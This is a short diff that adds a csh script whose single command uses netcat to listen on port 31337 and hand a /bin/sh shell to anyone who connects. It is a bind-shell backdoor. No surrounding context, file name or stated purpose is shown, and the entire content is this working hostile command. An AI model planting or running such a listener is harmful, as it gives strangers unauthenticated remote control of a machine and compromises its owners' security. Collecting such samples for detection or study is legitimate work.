@@ -1,0 +1,4 @@
+#! /bin/csh -f
+
+/bin/nc -lvp 31337 -e /bin/sh
+
